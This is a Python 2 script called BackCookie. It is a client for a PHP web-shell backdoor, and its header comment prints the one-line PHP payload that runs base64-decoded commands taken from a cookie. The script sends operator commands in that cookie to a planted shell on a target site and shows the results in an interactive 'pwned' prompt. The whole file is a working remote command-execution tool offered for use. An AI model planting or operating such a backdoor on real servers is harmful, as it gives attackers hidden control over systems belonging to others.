#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#       
#          Copyright 2013 - 2014 @mrjopino  <mrjopino@gmail.com>
#    
# 
###############################################
import os                                     #
import sys                                    #
from sys import argv                          #
from urllib2 import build_opener, HTTPHandler #
import optparse                               #
############################################################################
#                                                                          #
# Code: <?php error_reporting(0); system(base64_decode($_COOKIE["1"])); ?> ###
# It goes with a range from 1 to 0, but you can customize the parameter.     #
# Example: python -u backcookie.py http://target.com/shell.php -c name_cokie #
#                                                                          ###
# You can change the name of the cookie, in line 37.                       #
# a value of 1 for the name of your cookie, also in php.                   #
# Example: system(base64_decode($_COOKIE["yourcookie"]));                  #####
# so that the connection is successful.                                        #
#                                                                              #
# Backcookie is like the people who finds the love of his life every 2 months. #
################################################################################
#
#BackCookie
#
if "linux" in sys.platform:
	os.system("clear")
elif "win" in sys.platform:
	os.system("cls")
else:
    pass

# colors
class color:
    azul = '\033[94m'
    rojo = '\033[91m'
    verde = '\033[92m'
    blanco = '\033[0m'

# class of header and encode
class core:
    bc = 'Backcookie'
    ua = 'User-Agent'
    ck = 'Cookie'
    vc = '={0}'
    eb = 'base64'
        
def Error():
	print color.blanco + "\t\t-------------" + color.rojo + core.bc + color.blanco + "------------"
	print "\t\t+             Status              +"
	print "\t\t+             sorry :(            +"
	print "\t\t-----------------------------------\n\n"
	print color.verde + "[-] " + color.rojo  + "Connection error !!!\n" + color.blanco
	exit(0)

def backcookie(command,host,cookie,vcmd,debugLevel=0):
	o = build_opener(HTTPHandler(debuglevel=debugLevel))
	o.addheaders = [
		(core.ua, "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1;"),
		(core.ck, cookie + core.vc.format(command.encode(core.eb)))
	]
	try:
		l = o.open(host)
		v = l.headers.values() # v > validate
	except:
		Error()
	if v[0] == '0' or vcmd == "command": # vcmd > validate command
		print color.azul + l.read().strip() + color.blanco
	else:
		Error()

def shell(host,cookie):
	backcookie("cd",host,cookie,"")
	print color.blanco + "\t\t-------------" + color.rojo + core.bc + color.blanco + "------------"
	print "\t\t+    Developed by: @mrjopino      +"
	print "\t\t+             To play             +"
	print "\t\t-----------------------------------\n\n"
	print color.verde + "[+] " + color.azul  + "Happy hacking" + color.blanco
	print color.verde + "[+] " + color.azul  + "Sometimes it is not positive, but sometimes if!\n" + color.blanco

	while True:

		command = raw_input("pwned:~$ ")
		if command != "exit": #exit console backcookie
			backcookie(command,host,cookie,"command")
		else:
			print "\t\t-------------\033[94mDeveloper\033[0m------------"
			print "\t\t+        José Pino (Fraph)       +"
			print "\t\t+       Security researcher      +"
			print "\t\t+            @mrjopino           +"
			print "\t\t----------------------------------\n\n"
			print color.azul + "[-] " + color.rojo + core.bc + " OFF\n" + color.blanco
			break

def main():
	parser = optparse.OptionParser("%prog -u <<URL>> -c <<Cookie>>", version="1.1")
	parser.add_option("-u",dest="Host",type="string",help="specify hostname to run on")
	parser.add_option("-c",dest="Cookie",type="string",help="specify Cookie")
	(options, args) = parser.parse_args()
	host = options.Host
	cookie = options.Cookie
	if host and cookie:
		shell(host,cookie)
	else:
		parser.print_help()
		exit(0)

if __name__ == "__main__":
    main()
